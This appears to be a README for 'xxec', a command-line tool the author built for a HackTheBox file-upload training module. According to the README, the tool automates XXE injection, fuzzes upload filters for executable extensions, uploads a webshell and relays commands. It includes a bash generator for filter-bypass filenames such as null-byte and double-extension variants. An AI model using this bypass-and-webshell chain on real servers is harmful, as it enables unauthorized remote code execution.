# xxec
A command-line tool for exploiting XXE injection via file uploads

I built this tool to automate XXE injection for the **HackTheBox - File Upload Attacks** module. 

The script fuzzes for file extensions that have code execution, uploads a webshell and then allows the user to issue commands directly from the command line. 

## Arguments

- `-H`: Host (IP of the server)
- `-p`: Port (Port on which the web application is running)
- `-w`: Wordlist (Wordlist containing extensions to fuzz, items in the wordlist must be of the form `.ext`)
- `-c`: Check Directory (Directory where uploaded files are placed, you should omit the first `/` from the path as the script handles it automatically as shown in usage example below)

## Wordlist Generation

If you are coming here from the **File Upload Attacks - Skills Assessment** on **HTB**, you should make use of the wordlist generator provided within the module. 

Adjusted for the tool:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' 'â€¦' ':'; do
    for ext in '.php' '.phps' '.phar' '.phtml'; do
        echo "$char$ext.svg" >> extensions-svg.txt
        echo "$ext$char.svg" >> extensions-svg.txt
        echo "svg$char$ext"  >> extensions-svg.txt
        echo "svg$ext$char"  >> extensions-svg.txt
    done
done
```

## Usage

```shell
python3 xxec.py -H SERVER -p PORT -w extensions-svg.txt -c 'path/to/directory/'
